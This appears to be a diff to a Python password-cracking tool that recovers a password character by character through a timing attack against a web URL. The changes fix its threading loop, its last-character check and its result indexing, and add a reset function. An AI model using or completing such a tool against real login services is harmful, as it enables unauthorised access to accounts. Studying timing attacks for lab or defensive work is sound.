@@ -413,23 +413,23 @@ def _check_last_char(start_url: str, end_url: str, password: str, password_size:
     """
     future_results = []  # result for the thread pool
 
-    if Configurations.use_thread_pool:
-        thread_pool = ThreadPoolExecutor(max_workers=Configurations.max_of_threads)
+    thread_pool = ThreadPoolExecutor(max_workers=Configurations.max_of_threads)
 
-    for ch in Configurations.characters and len(Configurations.password) > 0:
-        url_time_command, url_result_command, url, password = _get_url_params(start_url, end_url, password_size, password, ch)
+    for ch in Configurations.characters:
+        if len(Configurations.password) == 0:
+            url_time_command, url_result_command, url, password = _get_url_params(start_url, end_url, password_size, password, ch)
 
-        future_results.append(
-            thread_pool.submit(
-                crack_password_thread,
-                url_time_command,
-                url_result_command,
-                ch,
-                password,
-                1,
-                logger
+            future_results.append(
+                thread_pool.submit(
+                    crack_password_thread,
+                    url_time_command,
+                    url_result_command,
+                    ch,
+                    password,
+                    1,
+                    logger
+                )
             )
-        )
 
     if Configurations.use_thread_pool:
         thread_pool.shutdown(wait=True)
@@ -487,7 +487,7 @@ def _crack_password_step(start_url, end_url, password, password_size, logger) ->
 
         for password_length in range(len(future_results)):  # move future object to result dictionary
             result = future_results[password_length].result()
-            results[password_length] = result
+            results[Configurations.letters_lower[password_length]] = result
 
     return results
 
@@ -511,8 +511,8 @@ def crack_password(password_size: int, start_url: str = "", end_url: str = "", l
     for i in range(password_size):  # iterate all password by length
 
         # if i == password_size - len(password):  # last iteration
-        if len(password) == password_size:  # last iteration
-            _check_last_char()
+        if len(password) + 1 == password_size:  # last iteration
+            _check_last_char(start_url, end_url, password, password_size, logger)
 
             return Configurations.password
 
@@ -532,6 +532,15 @@ def crack_password(password_size: int, start_url: str = "", end_url: str = "", l
     return Configurations.password if Configurations.password != "" else None
 
 
+def _reset_timinig_atttack() -> None:
+    """
+    This fucntionreset all parameter need to tun timing attack.
+
+    :return: None.
+    """
+    Configurations.password = ""
+
+
 def timing_attack(start_url: str = "", end_url: str = "", max_password_size: int = Configurations.default_password_size) -> str:
     """
     This function get url and password size and return the password by using a time attack.
@@ -542,6 +551,8 @@ def timing_attack(start_url: str = "", end_url: str = "", max_password_size: int
 
     :return: str. password as a string. None if couldn't find any.
     """
+    _reset_timinig_atttack()
+
     if Configurations.use_logger:
         logger = set_logger(Configurations.result_path, "crack password")
     else:
